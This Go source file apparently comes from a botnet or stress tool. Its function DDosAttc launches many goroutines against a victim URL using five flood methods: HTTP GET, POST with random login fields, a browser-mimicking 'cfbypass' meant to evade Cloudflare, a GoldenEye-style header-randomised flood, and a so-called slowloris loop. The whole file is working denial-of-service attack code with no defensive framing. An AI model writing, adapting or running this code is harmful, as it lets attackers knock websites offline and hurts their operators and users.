package utils

import (
	"io"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"time"
	"fmt"
)

func DDosAttc(attc string, vic string, threads int, interval int) {
	if attc == "0" { 
		if strings.Contains(vic, "http://") || strings.Contains(vic, "https://") {
			SetDDoSMode(true)
			for i := 0; i < threads; i++ {
				go httpGetAttack(vic, interval)
			}
		}
	} else if attc == "1" { 
		if strings.Contains(vic, "http://") || strings.Contains(vic, "https://") {
			SetDDoSMode(true)
			u, _ := url.Parse(vic)
			for i := 0; i < threads; i++ {
				go cfbypass(vic, u.Host, interval)
			}
		}
	} else if attc == "2" {
		if strings.Contains(vic, "http://") || strings.Contains(vic, "https://") {
			SetDDoSMode(true)
			for i := 0; i < threads; i++ {
				go slowlorisAttack(vic, interval)
			}
		}
	} else if attc == "3" { 
		if strings.Contains(vic, "http://") || strings.Contains(vic, "https://") {
			SetDDoSMode(true)
			for i := 0; i < threads; i++ {
				go goldenEyeAttack(vic, interval)
			}
		}
	} else if attc == "4" { 
		if strings.Contains(vic, "http://") || strings.Contains(vic, "https://") {
			SetDDoSMode(true)
			for i := 0; i < threads; i++ {
				go postAttack(vic, interval)
			}
		}
	}
}

func httpGetAttack(Target string, interval int) {
	for isDDoS {
		resp, err := http.Get(Target)
		if err != nil	{
			continue
		}
		defer func() {
			if r := recover(); r != nil {
				fmt.Println("ERROR")
			}
		}()
		closeConnction(resp)
		time.Sleep(time.Duration(interval) * time.Millisecond)
	}
}

func postAttack(Target string, interval int) {
	for isDDoS {
		resp, err := http.PostForm(Target, url.Values{"user": {RandomString(5, false)}, "pass": {RandomString(5, false)}, "captcha": {RandomString(5, false)}})
		if err != nil	{
			continue
		}
		defer func() {
			if r := recover(); r != nil {
				fmt.Println("ERROR")
			}
		}()
		closeConnction(resp)
		time.Sleep(time.Duration(interval) * time.Millisecond)
	}
}

func closeConnction(resp *http.Response) {
	if resp != nil {
		io.Copy(ioutil.Discard, resp.Body)
	}
}

func cfbypass(url string, host string, interval int) {
	tr := &http.Transport{
		MaxIdleConns:       10,
		IdleConnTimeout:    30 * time.Second,
		DisableCompression: true,
	}
	var client = new(http.Client)
	if strings.Contains(url, "http://") {
		client = new(http.Client)
	} else {
		client = &http.Client{Transport: tr}
	}
	for isDDoS {
		defer func() {
			if r := recover(); r != nil {
				fmt.Println("ERROR")
			}
		}()
		rand.Seed(time.Now().UTC().UnixNano())
		q, _ := http.NewRequest("GET", url, nil)
		q.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
		q.Header.Set("Accept-Encoding", "gzip, deflate, br")
		q.Header.Set("Accept-Language", "de,en-US;q=0.7,en;q=0.3")
		q.Header.Set("Cache-Control", "no-cache")
		q.Header.Set("Connection", "keep-alive")
		q.Header.Set("Pragma", "no-cache")
		q.Header.Set("Upgrade-Insecure-Requests", "1")
		q.Header.Set("User-Agent", headersUseragents[rand.Intn(len(headersUseragents))])
		q.Header.Set("Sec-Fetch-Dest", "document")
		q.Header.Set("Sec-Fetch-Mode", "navigate")
		q.Header.Set("Sec-Fetch-Site", "none")
		q.Header.Set("Sec-Fetch-User", "?1")
		q.Header.Set("X-Requested-With", "XMLHttpRequest")
		r, err := client.Do(q)
		if err != nil	{
			continue
		}
		r.Body.Close()
		time.Sleep(time.Duration(interval) * time.Millisecond)
	}
}

func buildblock(size int) (s string) {
	var a []rune
	for i := 0; i < size; i++ {
		rand.Seed(time.Now().UTC().UnixNano())
		a = append(a, rune(rand.Intn(25)+65))
	}
	return string(a)
}

func goldenEyeAttack(vic string, interval int) {
	tr := &http.Transport{
		MaxIdleConns:       10,
		IdleConnTimeout:    30 * time.Second,
		DisableCompression: true,
	}
	var client = new(http.Client)
	if strings.Contains(vic, "http://") {
		client = new(http.Client)
	} else {
		client = &http.Client{Transport: tr}
	}
	for isDDoS {
		defer func() {
			if r := recover(); r != nil {
				fmt.Println("ERROR")
			}
		}()
		rand.Seed(time.Now().UTC().UnixNano())
		q, _ := http.NewRequest("GET", vic, nil)
		q.Header.Set("User-Agent", headersUseragents[rand.Intn(len(headersUseragents))])
		q.Header.Set("Cache-Control", "no-cache")
		q.Header.Set("Accept-Encoding", `*,identity,gzip,deflate`)
		q.Header.Set("Accept-Charset", `ISO-8859-1, utf-8, Windows-1251, ISO-8859-2, ISO-8859-15`)
		q.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]+buildblock(rand.Intn(5)+5))
		q.Header.Set("Keep-Alive", strconv.Itoa(20000))
		q.Header.Set("Connection", "keep-alive")
		q.Header.Set("Content-Type", `multipart/form-data, application/x-url-encoded`)
		q.Header.Set("Cookies", RandomString(25, false))
		r, err := client.Do(q)
		if err != nil	{
			continue
		}
		r.Body.Close()
		time.Sleep(time.Duration(interval) * time.Millisecond)
	}
}

func slowlorisAttack(vic string, interval int) {
	tr := &http.Transport{
		MaxIdleConns:       10,
		IdleConnTimeout:    30 * time.Second,
		DisableCompression: true,
	}
	var client = new(http.Client)
	if strings.Contains(vic, "http://") {
		client = new(http.Client)
	} else {
		client = &http.Client{Transport: tr}
	}
	for isDDoS {
		defer func() {
			if r := recover(); r != nil {
				fmt.Println("ERROR")
			}
		}()
		rand.Seed(time.Now().UTC().UnixNano())
		req, _ := http.NewRequest("GET", vic+RandomString(5, true), nil)
		req.Header.Add("User-Agent", headersUseragents[rand.Intn(len(headersUseragents))])
		req.Header.Add("Content-Length", "42")
		resp, err := client.Do(req)
		if err != nil	{
			continue
		}
		defer resp.Body.Close()
		time.Sleep(time.Duration(interval) * time.Millisecond)
	}
}
